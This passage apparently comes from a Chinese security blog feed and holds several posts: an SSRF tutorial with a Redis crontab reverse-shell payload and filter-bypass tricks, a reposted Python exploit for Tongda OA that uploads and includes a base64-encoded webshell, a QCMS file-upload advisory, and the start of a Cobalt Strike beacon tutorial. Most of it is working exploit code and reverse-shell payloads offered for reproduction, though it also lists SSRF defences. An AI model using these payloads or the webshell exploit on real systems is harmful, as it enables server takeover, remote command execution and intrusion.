class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.19.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>注意，换行符是“\r\n”，也就是“%0D%0A”。</p><h4 id="实施攻击"><a href="#实施攻击" class="headerlink" title="实施攻击"></a><strong>实施攻击</strong></h4><p>本机监听端口：nc -lvvp 2333</p><p>注意IP要填对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp 这个肯定是weblogic的能访问的地方了</span><br><span class="line"></span><br><span class="line">operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;  这个是redis的IP和端口</span><br><span class="line"></span><br><span class="line">最后一个ip</span><br><span class="line">192.168.0.100%2F2333  这个是要反弹shell的主机ip和端口</span><br></pre></td></tr></table></figure><p>浏览器访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.100%2F2333%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p>反弹shell成功！<br><img src="https://img-blog.csdnimg.cn/20200322105240681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x06-绕过技术"><a href="#0x06-绕过技术" class="headerlink" title="0x06 绕过技术"></a>0x06 绕过技术</h1><h4 id="常用绕过方法"><a href="#常用绕过方法" class="headerlink" title="常用绕过方法"></a>常用绕过方法</h4><p><strong>1.@</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;abc@127.0.0.1</span><br><span class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</span><br><span class="line">http:&#x2F;&#x2F;8.8.8.8@127.0.0.1:8080、http:&#x2F;&#x2F;127.0.0.1#8.8.8.8</span><br></pre></td></tr></table></figure><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br>在PHP的<code>parse_url</code>中会识别<a href="http://www.ccc.com，而`libcur`l则识别为www.bbb.com" target="_blank" rel="noopener">www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br><strong>2.利用[::]</strong><br>可以利用<code>[::]</code>来绕过localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::]:80&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>3.利用短网址</strong></p><p>站长工具短网址(<a href="http://tool.chinaz.com/tools/dwz.aspx\" target="_blank" rel="noopener">http://tool.chinaz.com/tools/dwz.aspx\</a>)<br>跳转要去的地址</p><p><strong>4.利用特殊域名</strong><br>原理是DNS解析。xip.io可以指向任意域名，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1.xip.io，可解析为127.0.0.1</span><br></pre></td></tr></table></figure><p><strong>5.利用DNS解析</strong></p><p>在域名上设置A记录，指向127.0.0.1</p><p><strong>6.302跳转</strong></p><p>使用302跳转地址</p><p><strong>7.利用进制转换</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">八进制：0177.0.0.1</span><br><span class="line">十六进制：0x7f.0.0.1</span><br><span class="line">十进制：2130706433</span><br></pre></td></tr></table></figure><p><strong>8.句号</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h4 id="2、常见限制"><a href="#2、常见限制" class="headerlink" title="2、常见限制"></a>2、常见限制</h4><p><strong>1.限制为<a href="http://www.xxx.com/" target="_blank" rel="noopener">http://www.xxx.com</a> 域名</strong><br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code><br><strong>2.限制请求IP不为内网地址</strong><br>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换<br><strong>3.限制请求只为http协议</strong><br>（1）采取302跳转<br>（2）采取短地址</p><h1 id="0x07-审计php常见的函数"><a href="#0x07-审计php常见的函数" class="headerlink" title="0x07 审计php常见的函数"></a>0x07 审计php常见的函数</h1><p><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞</p><p>（1）file_get_contents() 函数从用户指定的url获取内容，并展示给用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（2）fsockopen()</p><p>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) &#123; </span><br><span class="line">    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);   </span><br><span class="line">    if (!$fp) &#123; </span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">    &#125; else &#123; </span><br><span class="line">        $out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Host: $host\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;; </span><br><span class="line">        $out .&#x3D; &quot;\r\n&quot;; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents&#x3D;&#39;&#39;; </span><br><span class="line">        while (!feof($fp)) &#123; </span><br><span class="line">            $contents.&#x3D; fgets($fp, 1024); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        return $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>（3）curl_exec() 函数用于执行指定的cURL会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#39;url&#39;]))&#123;</span><br><span class="line">    $link &#x3D; $_POST[&#39;url&#39;];</span><br><span class="line">    $curlobj &#x3D; curl_init();&#x2F;&#x2F; 创建新的 cURL 资源</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">    curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);&#x2F;&#x2F; 设置 URL 和相应的选项</span><br><span class="line">    $result&#x3D;curl_exec($curlobj);&#x2F;&#x2F; 抓取 URL 并把它传递给浏览器</span><br><span class="line">    curl_close($curlobj);&#x2F;&#x2F; 关闭 cURL 资源，并且释放系统资源</span><br><span class="line"></span><br><span class="line">    $filename &#x3D; &#39;.&#x2F;curled&#x2F;&#39;.rand().&#39;.txt&#39;;</span><br><span class="line">    file_put_contents($filename, $result); </span><br><span class="line">    echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="0x08防御技术"><a href="#0x08防御技术" class="headerlink" title="0x08防御技术"></a>0x08防御技术</h1><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和https请求<br>2、统一错误信息，防止根据错误信息判断端口状态<br>3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br>4、设置URL白名单或者限制内网IP</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2115#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115#toc-2</a></p><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通达OA前台RCE加EXP任意文件上传+文件包含</title>
      <link href="/2020/03/18/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0RCE%E5%8A%A0EXP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2020/03/18/%E9%80%9A%E8%BE%BEOA%E5%89%8D%E5%8F%B0RCE%E5%8A%A0EXP%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>RCE思路如下：未授权上传文件（jpg）-&gt;php代码包含-&gt;rce<br>理论上是通杀，但是貌似2015版没有包含功能<br>大家可以复现了</p><p><img src="https://img-blog.csdnimg.cn/20200318165233465.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义webshell，因为是包含，所以用写入马比较方便</span></span><br><span class="line"><span class="comment"># 这个马自带bypass disable_function 功能</span></span><br><span class="line">shell = <span class="string">'''&lt;?php</span></span><br><span class="line"><span class="string">$fp = fopen('poc.php', 'w+');</span></span><br><span class="line"><span class="string">$a = base64_decode("JTNDJTNGcGhwJTBBJTI0Y29tbWFuZCUzRCUyNF9HRVQlNWIlMjdhJTI3JTVkJTNCJTBBJTI0d3NoJTIwJTNEJTIwbmV3JTIwQ09NJTI4JTI3V1NjcmlwdC5zaGVsbCUyNyUyOSUzQiUwQSUyNGV4ZWMlMjAlM0QlMjAlMjR3c2gtJTNFZXhlYyUyOCUyMmNtZCUyMC9jJTIwJTIyLiUyNGNvbW1hbmQlMjklM0IlMEElMjRzdGRvdXQlMjAlM0QlMjAlMjRleGVjLSUzRVN0ZE91dCUyOCUyOSUzQiUwQSUyNHN0cm91dHB1dCUyMCUzRCUyMCUyNHN0ZG91dC0lM0VSZWFkQWxsJTI4JTI5JTNCJTBBZWNobyUyMCUyNHN0cm91dHB1dCUzQiUwQSUzRiUzRQ==");</span></span><br><span class="line"><span class="string">fwrite($fp, urldecode($a));</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入目标</span></span><br><span class="line">url = input(<span class="string">"input the TARGET(example:[url]https://127.0.0.1:1080[/url])&gt;"</span>)</span><br><span class="line"><span class="comment"># 定义上传目录和包含目录</span></span><br><span class="line">upload_url = url+<span class="string">"/ispirit/im/upload.php"</span></span><br><span class="line">include_url = url+<span class="string">"/ispirit/interface/gateway.php"</span></span><br><span class="line"><span class="comment"># 定义shell目录，如果要修改名字，需要把shell里面的一起改了</span></span><br><span class="line">shell_url = url+<span class="string">"/ispirit/interface/poc.php"</span></span><br><span class="line">files = &#123;<span class="string">'ATTACHMENT'</span>: shell&#125;</span><br><span class="line"><span class="comment"># 参见源码，有漏洞的版本只要POST P和DEST_UID参数就会自动生成session</span></span><br><span class="line">upload_data = &#123;<span class="string">"P"</span>: <span class="string">"123"</span>, <span class="string">"DEST_UID"</span>: <span class="string">"1"</span>, <span class="string">"UPLOAD_MODE"</span>: <span class="string">"2"</span>&#125;</span><br><span class="line"><span class="comment"># 上传</span></span><br><span class="line">upload_res = requests.post(upload_url, upload_data, files=files)</span><br><span class="line"><span class="comment"># 此时会返回上传文件的路径</span></span><br><span class="line">path = upload_res.text</span><br><span class="line"><span class="comment"># 解析返回值获取上传地址</span></span><br><span class="line">path = path[path.find(<span class="string">'@'</span>)+<span class="number">1</span>:path.rfind(<span class="string">'|'</span>)</span><br><span class="line">            ].replace(<span class="string">"_"</span>, <span class="string">"\/"</span>).replace(<span class="string">"|"</span>, <span class="string">"."</span>)</span><br><span class="line"><span class="comment"># 由于上传文件会自动改为jpg，所以要用gateway.php包含</span></span><br><span class="line">include_data = &#123;<span class="string">"json"</span>: <span class="string">"&#123;\"url\":\"/general/../../attach/im/"</span> + path+<span class="string">"\"&#125;"</span>&#125;</span><br><span class="line"><span class="comment"># 包含+自动写入shell</span></span><br><span class="line">include_res = requests.post(include_url, data=include_data)</span><br><span class="line"><span class="comment"># 返回结果 a参数可以直接填入系统命令（比如whoami），默认是system权限</span></span><br><span class="line">print(<span class="string">'shell is here:'</span>+shell_url+<span class="string">'?a=command'</span>)</span><br></pre></td></tr></table></figure><p>转自：<a href="https://www.t00ls.net/thread-55458-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55458-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QCMS v3.01 has Unrestricted Upload vulnerability</title>
      <link href="/2020/03/16/QCMS%20v3.01%20has%20Unrestricted%20Upload%20vulnerability/"/>
      <url>/2020/03/16/QCMS%20v3.01%20has%20Unrestricted%20Upload%20vulnerability/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>– Title: QCMS v3.01 has Unrestricted Upload vulnerability</p><p>– Date: 2020-01-28<br>– Exploit Author: zeo<br>– Official download address of QCMS: <a href="http://www.q-cms.cn/" target="_blank" rel="noopener">http://www.q-cms.cn/</a><br>– The latest version I tested should be version 3.0.1 according to the official website description<br>– Version: v3.01<br>– Tested on Windows 7</p><p>– QCMS v3.01 allows Unrestricted Upload of a File with a Dangerous Types to /backend/system.php</p><p>– The vulnerable code is located in</p><p>Lib-&gt;Config-&gt;Controllers.php-&gt;public function upload($file_arr = array()){<br><img src="https://img-blog.csdnimg.cn/20200316220247224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Not to upload types for effective detection, lead to upload any file, can be directly getshell</p><p>– Proof of  Unrestricted Upload:</p><p>1.login QCMS<br>The default  user and password：admin admin<br><a href="http://127.0.0.1/admin/" target="_blank" rel="noopener">http://127.0.0.1/admin/</a><br><img src="https://img-blog.csdnimg.cn/20200316215743363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 Visit vulnerability url <a href="http://127.0.0.1/backend/system.php" target="_blank" rel="noopener">http://127.0.0.1/backend/system.php</a><br>Click on the upload，Can upload webshell directly<br><img src="https://img-blog.csdnimg.cn/20200316220607942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3 Copy the reflection upload address, visit<br><a href="http://127.0.0.1//Static/upload/source/20200316/3415e6f41aae98939.php" target="_blank" rel="noopener">http://127.0.0.1//Static/upload/source/20200316/3415e6f41aae98939.php</a></p><p><img src="https://img-blog.csdnimg.cn/20200316220749583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>successful<br><img src="https://img-blog.csdnimg.cn/2020031622092694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 申请 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用</title>
      <link href="/2020/03/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%BA%8C-Beacon%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/03/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1-%E7%A5%9E%E5%99%A8-Cobalt%20Strike-%E4%BA%8C-Beacon%E7%AE%80%E4%BB%8B%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="内网安全学习从入门到入狱-神器-Cobalt-Strike2-Beacon简介和使用"><a href="#内网安全学习从入门到入狱-神器-Cobalt-Strike2-Beacon简介和使用" class="headerlink" title="内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用"></a>内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用</h1><h3 id="内网安全学习从入门到入狱-神器-Cobalt-Strike-二-Beacon简介和使用"><a href="#内网安全学习从入门到入狱-神器-Cobalt-Strike-二-Beacon简介和使用" class="headerlink" title="内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用"></a>内网安全学习从入门到入狱-神器-Cobalt Strike-二-Beacon简介和使用</h3><ul><li><a href="#Cobalt_Strike2Beacon_1">内网安全学习从入门到入狱-神器-Cobalt Strike2-Beacon简介和使用</a></li><li><ul><li><a href="#0x01PC_18">0x01简单的木马打到一台PC</a></li><li><ul><li><a href="#win_Payload_28">生成win的 Payload</a></li></ul></li><li><a href="#0x02_beacon_50">0x02 beacon的介绍和使用</a></li><li><ul><li><a href="#Beacon_54">Beacon简介</a></li><li><a href="#Beacon_78">Beacon分类：</a></li><li><ul><li><a href="#http_beacon_86">http beacon</a></li><li><a href="#DNS_beacon_90">DNS beacon</a></li><li><a href="#SMB_beacon_106">SMB beacon</a></li></ul></li><li><a href="#beacon_116">进入beacon</a></li><li><a href="#_226">简单的命令执行</a></li><li><a href="#_252">最常用的修改心跳包</a></li></ul></li></ul></li></ul><p><a href="https://blog.csdn.net/god_zzZ/article/details/104690519" target="_blank" rel="noopener">内网安全学习从入门到入狱-工具-Cobalt Strike(cs)基础</a></p><p>上一次Cobalt Strike写到简单的介绍和启动服务和打开</p><ul><li>这一次我们写简单的木马生成以便介绍后续的功能</li><li>介绍一下beacon的作用和一下常用的操作</li></ul><h2 id="0x01简单的木马打到一台PC"><a href="#0x01简单的木马打到一台PC" class="headerlink" title="0x01简单的木马打到一台PC"></a>0x01简单的木马打到一台PC</h2><p>我们得有一个机子才能做后续的实验吧，所以</p><p>这算是获得了一个入口的机器</p><p>这才是一台win7来介绍一下beacon</p><h3 id="生成win的-Payload"><a href="#生成win的-Payload" class="headerlink" title="生成win的 Payload"></a>生成win的 Payload</h3><p>1、attacks-packages-Windows excutable</p><p><img src="https://img-blog.csdnimg.cn/20200315184828350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2、点击ADD，增加一个监听器</p><p><img src="https://img-blog.csdnimg.cn/20200315185334141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3、name随便写，host写服务器地址默认，端口自己定</p><p><img src="https://img-blog.csdnimg.cn/20200315185322120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4、点击save，出现一个exe，自己放到win7里面运行一下</p><p>5、主机上线</p><p><img src="https://img-blog.csdnimg.cn/20200315185436213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-beacon的介绍和使用"><a href="#0x02-beacon的介绍和使用" class="headerlink" title="0x02 beacon的介绍和使用"></a>0x02 beacon的介绍和使用</h2><h3 id="Beacon简介"><a href="#Beacon简介" class="headerlink" title="Beacon简介"></a>Beacon简介</h3><ul><li>那个作者说Beacon是Cobalt Strike运行在目标主机上的payload</li><li>翻译过来是叫信标，我觉得这个好理解</li><li>Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机**。**</li><li>它的工作方式与Metasploit Framework Payload类似</li><li>Beacon嵌入到可执行文件、添加到Word文档和一些漏洞 来传递Beacon</li></ul><p>执行我们的Payload后，即可发现目标机已经上线</p><blockquote><p><strong>Beacon有两种通信策略</strong>（与团队服务器通信-CS 中以团队服务器作为 C2）</p><ol><li><p><strong>异步式通信</strong> = 异步模式下通信频率低、速度慢，如上图所示：Beacon会主动请求任务列表、然后进入SLEEP状态。</p></li><li><p><strong>交互式通信</strong> = C2 对 Beacon 实时控制</p></li></ol></blockquote><h3 id="Beacon分类："><a href="#Beacon分类：" class="headerlink" title="Beacon分类："></a>Beacon分类：</h3><ol><li><p>HTTP and HTTPS Beacon</p></li><li><p>DNS Beacon</p></li><li><p>SMB Beacon</p></li></ol><h4 id="http-beacon"><a href="#http-beacon" class="headerlink" title="http beacon"></a>http beacon</h4><p>这个应该最简单，关键是Beacon通过GET请求来下载任务</p><h4 id="DNS-beacon"><a href="#DNS-beacon" class="headerlink" title="DNS beacon"></a>DNS beacon</h4><p>DNS Beacon在绕过防火墙 权限维持上非常有效</p><p>下面是主要流程，简单来说，就是靠dns解析找到你</p><p>整个配置过程非常简单，一条A记录和几条NS记录即可</p><p>配置A记录指向服务器ip ns记录都指向A记录域名</p><p><img src="https://img-blog.csdnimg.cn/20200315185456824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><h4 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h4><p>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</p><p>派生一个SMB Beacon方法：</p><p>在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn as&gt;选中对应的Listener&gt;上线</p><p>或在Beacon中使用命令<code>spawn 监听器</code></p><h3 id="进入beacon"><a href="#进入beacon" class="headerlink" title="进入beacon"></a>进入beacon</h3><p>1、右键目标interact来使用Beacon，我们用它来执行各种命令</p><p><img src="https://img-blog.csdnimg.cn/20200315185512688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>2、下放输入help 查看功能</p><p>Beacon中输入help来获取。</p><p><img src="https://img-blog.csdnimg.cn/20200315185620320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在这贴出一部分汉化的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line"> Command Description</span><br><span class="line"> ------- -----------</span><br><span class="line"> browserpivot 注入受害者浏览器进程</span><br><span class="line"> bypassuac 绕过UAC</span><br><span class="line"> cancel 取消正在进行的下载</span><br><span class="line"> cd 